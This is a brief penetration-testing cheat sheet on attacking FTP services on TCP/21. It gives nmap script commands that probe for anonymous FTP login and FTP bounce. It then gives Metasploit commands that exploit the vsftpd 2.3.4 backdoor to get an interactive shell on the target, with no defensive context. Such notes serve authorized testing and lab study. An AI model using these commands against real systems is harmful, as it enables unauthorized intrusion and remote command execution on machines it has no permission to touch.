---
description: TCP/21
---

# FTP

### nmap scripts

```bash
#check for anonymous
nmap -v -p 21 --script=ftp-anon.nse $ip-254

nmap -sT -p 21 -v -n -Pn --script ftp-bounce $ip

```

### VSFTPD

version 2.3.4 is vulnerable

```bash
msf> exploit/unix/ftp/vsftp_234_backdoor
set payload cmd/unix/interact exploit
```

